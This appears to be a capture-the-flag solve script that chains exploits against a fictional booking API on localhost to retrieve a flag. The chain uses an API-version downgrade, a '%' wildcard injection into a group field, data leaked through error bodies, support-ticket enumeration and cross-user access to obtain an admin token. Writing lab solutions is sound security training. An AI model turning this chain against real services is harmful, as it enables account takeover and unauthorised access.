import requests
import json
import re

TARGET_USER_NAME = "Celebrimbor"
LAT_MIN = -44
LAT_MAX = -43
LONG_MIN = 170
LONG_MAX = 174
# end hints


def is_location_viable(lat: str, long: str):
    return LAT_MIN <= float(lat) <= LAT_MAX and LONG_MIN <= float(long) <= LONG_MAX

BASE_URL = "http://localhost:8000"

# helpers to auto-fail and dump json to console
def get(session: requests.Session, url: str, **kwargs) -> dict:
    return request("GET", session, url, **kwargs)


def post(session: requests.Session, url: str, **kwargs) -> dict:
    return request("POST", session, url, **kwargs)


def request(method: str, session: requests.Session, url: str, **kwargs) -> dict:
    response = session.request(method, f"{BASE_URL}{url}", **kwargs)
    try:
        data = response.json()
    except json.JSONDecodeError:
        raise ValueError(f"failed to parse json: {response.text}")

    try:
        response.raise_for_status()
    except requests.exceptions.HTTPError as e:
        print_json(data)
        raise e
    return data


def print_json(data):
    print(json.dumps(data, indent=4))


def main(user="baggins@local.host", pw="baggins"):
    v2 = requests.Session()
    legacy = requests.Session()
    palantir = requests.Session()
    target_user_id = None

    # register user
    try:
        post(v2, "/register", json={"name": "Baggins", "password": pw, "username": user})
    except requests.exceptions.HTTPError as e:
        # user can already exist, that's fine
        if e.response.status_code != 409:
            raise e

    # get v2 token
    v2_token = post(v2, "/token", data={"password": pw, "username": user})["access_token"]
    v2.headers["Authorization"] = f"Bearer {v2_token}"

    # get user id from reviews
    locations = get(v2, "/v2/locations", data={"size": "100"})
    for location in locations["items"]:
        reviews = get(v2, f"/v2/reviews/{location['id']}", params={"size": "100"})
        for review in reviews["items"]:
            if review["name"] == TARGET_USER_NAME:
                target_user_id = review["user_id"]
                break

        if target_user_id:
            break

    if not target_user_id:
        raise ValueError("Target user not found")

    print("TARGET USER ID:", target_user_id)
    # validate_user(target_user_id)

    # delete user
    user_info = get(v2, "/userinfo")
    user_id = user_info["id"]
    request("DELETE", v2, f"/v2/users/{user_id}")
    # try (fail) to patch user - get legacy api code
    response = v2.patch(f"{BASE_URL}/users/{user_id}", json={"primary_group_name": "%"})
    assert response.status_code == 403
    legacy_api_version = response.json()["requested_api_version"]
    legacy.headers["x-api-version"] = legacy_api_version

    # get legacy token
    legacy_token = post(legacy, "/token", data={"password": pw, "username": user})["access_token"]
    print('LEGACY TOKEN:', legacy_token)
    legacy.headers["Authorization"] = f"Bearer {legacy_token}"

    # patch user primary group to %
    request("PATCH", legacy, f"/users/{user_id}", json={"primary_group_name": "%"})

    # get group id from sqli on /userinfo
    target_group_id = None
    for group in get(v2, "/userinfo")["groups"]:
        # print_json(group)
        # print(group["owner_id"], target_user_id, group["owner_id"] == target_user_id)
        if group["owner_id"] == target_user_id:
            target_group_id = group["id"]
            break

    if not target_group_id:
        raise ValueError("Target group not found")

    print("TARGET GROUP ID:", target_group_id)
    # validate_group(target_group_id), "Group validation failed"

    # find activity id by searching /activities with group id
    activities = get(v2, "/v2/activities", params={"size": "100", "group_id": target_group_id})
    target_activity_id = target_day = None
    for activity in activities["items"]:
        if activity["creator_id"] == target_user_id:
            target_activity_id = activity["id"]
            target_day = activity["day"]
            break
    print("TARGET ACTIVITY ID:", target_activity_id)
    # validate_activity(target_activity_id)

    # find location id based on criteria
    # - available on activity date
    # - location within lat/long requirements
    # get possible locations by lat/long
    possible_locations = []
    for location in locations["items"]:
        if is_location_viable(location["lat"], location["long"]):
            possible_locations.append(location)

    # create activity that we can schedule
    if not target_day:
        raise ValueError("Target day not found")

    print("TARGET DAY:", target_day)
    activity = post(
        v2,
        "/v2/activities",
        json={
            "name": "The Shire",
            "day": target_day,
            "description": "Home of the hobbits",
            "currency": "hobs",
            "price": 0,
        },
    )

    # try to schedule activity at location on target date. looking for a location without conflict
    target_location_id = None
    target_locations = []
    for location in possible_locations:
        response = v2.post(f"{BASE_URL}/v2/activities/{activity['id']}/schedule/{location['id']}")
        # 500 = successful booking date, payment system down error
        if response.status_code == 500:
            print("500, found payment system")
            target_locations.append(location)
            target_location_id = location["id"]
        # 409 = date already booked
        elif response.status_code != 409:
            response.raise_for_status()

    if len(target_locations) > 1:
        print_json([{"lat": l["lat"], "long": l["long"], "name": l["name"], "id": l["id"]} for l in target_locations])
        raise ValueError("Multiple target locations viable")

    if not target_location_id:
        raise ValueError("Target location not found")

    print("TARGET LOCATION ID:", target_location_id)
    # validate_location(target_location_id)

    # PUT/DEL support requests, brute force until [ADMIN] request is returned
    palantir_token_endpoint = palantir_chat_endpoint = palantir_schedule_endpoint = None
    for i in range(100):
        response = legacy.delete(f"{BASE_URL}/support/{i + 1}")
        if response.status_code == 404:
            # no more to try
            raise ValueError("No more support requests to try")
        data = response.json()
        # we have to index into resource because we're reading an error
        if "ADMIN" in data["resource"]["title"]:
            # extract palantir endpoints
            # - glimpse
            # - schedule
            # - group chats
            for message in data["resource"]["messages"]:
                # print(message["message"])
                if "/palantir/glimpse" in message["message"]:
                    palantir_token_endpoint = "/palantir/glimpse"
                if "/groups/:group_id/activities/:activity_id/schedule/:location_id" in message["message"]:
                    palantir_schedule_endpoint = (
                        "/palantir/groups/{group_id}/activities/{activity_id}/schedule/{location_id}"
                    )
                if "/palantir/groups/:id/chats" in message["message"]:
                    palantir_chat_endpoint = "/palantir/groups/{group_id}/chats"
            break

    if not palantir_token_endpoint or not palantir_schedule_endpoint or not palantir_chat_endpoint:
        raise ValueError(
            f"failed to get a Palantir endpoint"
            f"{palantir_token_endpoint=} {palantir_schedule_endpoint=} {palantir_chat_endpoint=}"
        )
    # get admin token
    admin_token = post(legacy, palantir_token_endpoint)["access_token"]
    print('ADMIN TOKEN:', admin_token)
    palantir.headers["Authorization"] = f"Bearer {admin_token}"

    # get invite_code from group chat
    invite_code = None
    group_chats = get(palantir, palantir_chat_endpoint.format(group_id=target_group_id))
    for chats in group_chats:
        for obj in chats["messages"]:
            message = obj["message"]
            # print(message)
            if match := re.search(r"The word remains ([a-z0-9{}]+)", message):
                invite_code = match.groups()[0]

    if not invite_code:
        raise ValueError("Invite code not found")

    print("INVITE CODE", invite_code)
    # validate_invite_code(invite_code)

    # one request to rule them all!
    palantir_response = post(
        palantir,
        palantir_schedule_endpoint.format(
            group_id=target_group_id, activity_id=target_activity_id, location_id=target_location_id
        ),
        json={"user_id": target_user_id, "invite_code": invite_code},
    )
    print_json(palantir_response)
    try:
        assert palantir_response["flag"] is not None, "Flag not found"
    finally:
        return palantir_response


if __name__ == "__main__":
    main()
